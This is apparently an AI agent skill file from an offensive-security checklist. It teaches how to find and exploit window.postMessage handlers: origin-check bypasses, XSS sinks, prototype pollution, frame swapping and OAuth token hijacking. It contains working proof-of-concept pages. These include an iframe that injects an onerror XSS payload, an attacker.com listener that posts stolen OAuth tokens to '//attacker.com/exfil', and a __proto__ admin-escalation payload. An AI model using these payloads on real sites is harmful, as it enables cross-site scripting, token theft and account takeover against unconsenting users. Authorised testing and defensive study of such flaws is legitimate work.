---
name: offensive-postmessage
description: "window.postMessage origin abuse — missing or wildcard origin checks, source origin verification flaws, prototype-pollution via crafted messages, message-handler XSS sinks, OAuth flow hijacking via postMessage, and embedded-iframe communication abuse. Use when a target uses iframes / cross-window messaging — common in OAuth implementations, payment integrations, third-party embedded widgets (chat, analytics, customer support), and SSO post-handlers."
---

# postMessage Attacks

`window.postMessage` is how iframes / cross-origin windows talk in the browser. The sender can spoof; the receiver must validate `event.origin`. Missing or weak validation = cross-origin code execution / data theft.

## Quick Workflow

1. Find every `window.addEventListener('message', ...)` handler in the JS bundle
2. Check origin validation in each handler
3. Inject crafted messages into the page (via opened popup or framed window)
4. Drive each handler's logic to reach an injection sink

---

## Find Message Handlers

```bash
# In the JS bundle
grep -rE "addEventListener\\((['\"])message\\1|onmessage\\s*=" app.js

# Or via DevTools at runtime
# Sources panel → Search → "addEventListener" + "message"
```

For each handler, check:

```javascript
window.addEventListener('message', (event) => {
  // 1. Does it check event.origin?
  // 2. Is the check exact (===) or substring (.includes)?
  // 3. Does it pass event.data into innerHTML / eval / Function() / location?
  if (event.origin === 'https://trusted.com') {
    document.getElementById('out').innerHTML = event.data;   // XSS sink
  }
});
```

## Origin Check Flaws

### Missing Check

```javascript
window.addEventListener('message', (event) => {
  document.getElementById('out').innerHTML = event.data;
});
```

Any window can postMessage in. PoC:

```html
<iframe src="https://target.com/page-with-handler" id="t"></iframe>
<script>
document.getElementById('t').onload = () => {
  document.getElementById('t').contentWindow.postMessage('<img src=x onerror=alert(1)>', '*');
};
</script>
```

### Substring Check

```javascript
if (event.origin.includes('target.com')) { ... }
// Bypass: Origin: https://target.com.attacker.com
```

### startsWith / endsWith

```javascript
if (event.origin.startsWith('https://target.com')) { ... }
// Bypass: https://target.com.attacker.com
```

### URL Parsing Quirks

```javascript
new URL(event.origin).hostname === 'target.com'
// Less likely to bypass, but URL parser quirks exist
```

## Sinks

```javascript
// XSS sink
elem.innerHTML = event.data
elem.outerHTML = event.data
document.write(event.data)
eval(event.data)
new Function(event.data)()
setTimeout(event.data)
setInterval(event.data)

// Open redirect sink
location = event.data
location.href = event.data
location.replace(event.data)

// Prototype pollution sink
Object.assign(target, JSON.parse(event.data))
_.merge(target, event.data)

// Token / auth sinks
postAuth(event.data)   // hands token to caller without origin check
```

## OAuth Flow Hijacking

Common pattern: OAuth callback page receives the access token, then `postMessage`s it back to the opening window.

```javascript
// Vulnerable callback page
window.opener.postMessage({access_token: token}, '*');   // wildcard target
```

If `*` is used, any frame that opened the OAuth window can read the token. Combined with an attacker-controlled opener, full token theft.

```html
<!-- attacker.com -->
<button onclick="window.open('https://target.com/oauth/callback')">Continue</button>
<script>
window.addEventListener('message', e => {
  fetch('//attacker.com/exfil', {method:'POST', body: JSON.stringify(e.data)});
});
</script>
```

When the user clicks, OAuth flow happens in popup, popup posts token back to attacker.

## Embedded Widget Abuse

Customer-support widgets, analytics widgets, chat embeds — all use postMessage to talk to the host page. Two attack surfaces:

1. **Compromised vendor → message to all hosts** — vendor code update sends malicious message to embedded sites
2. **Attacker iframe impersonates vendor** — if origin check allows the vendor's domain via flaw, attacker can frame as vendor and send messages

## Two-Way Communication

When the page sends messages back, the receiving frame must also validate. Bidirectional auth must be checked both ways.

## Prototype Pollution via postMessage

```javascript
window.addEventListener('message', e => {
  Object.assign(state, JSON.parse(e.data));    // pollutes state's prototype
});
```

Send `{"__proto__": {"isAdmin": true}}` → state object's prototype polluted → any subsequent property check returns admin. See `offensive-prototype-pollution`.

## Frame Identification Confusion

Some apps maintain a list of trusted frames by reference (`frame.contentWindow`). If the attacker can swap the iframe `src` after registration, they impersonate the trusted frame.

```html
<iframe src="https://trusted.com" onload="register(this.contentWindow)"></iframe>
<!-- After register, change src to attacker -->
<script>setTimeout(() => document.querySelector('iframe').src = 'https://attacker.com', 5000);</script>
```

If the registry checks reference equality, the frame is now attacker's window with the trusted reference.

## Engagement Cheatsheet

```javascript
// 1. Find all handlers
// In JS bundle: grep "addEventListener.*message"

// 2. For each, check:
//    - Origin validation present?
//    - Exact equality (===)?
//    - String comparison flaws (includes, startsWith)?
//    - URL parsing (new URL().hostname)?

// 3. Test sinks reached by handler:
//    - innerHTML / outerHTML / document.write
//    - eval / Function
//    - location / location.href
//    - Object.assign / merge functions

// 4. Build PoC:
//    - HTML page that frames or opens target
//    - postMessage to target with crafted data
//    - Observe sink trigger (alert, redirect, exfil)

// 5. Test OAuth callback popups for wildcard target

// 6. Document: handler location, missing check, payload, impact
```

## Reporting

- File + line of vulnerable handler in JS bundle
- Origin check (or lack thereof)
- Sink reached
- PoC HTML page
- Impact: XSS, token theft, account takeover, etc.

## Detection

postMessage attacks are entirely client-side and produce no server-side trace beyond their consequences (XSS visible in CSP reports, token theft visible in access patterns afterwards). Server-side detection is indirect.

---

## Key References

- "DOM-based vulnerabilities" — PortSwigger
- "Pwning Pinkfloyd: postMessage attacks in production" (various BB writeups)
- HTML Living Standard — window.postMessage
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/postmessage.md
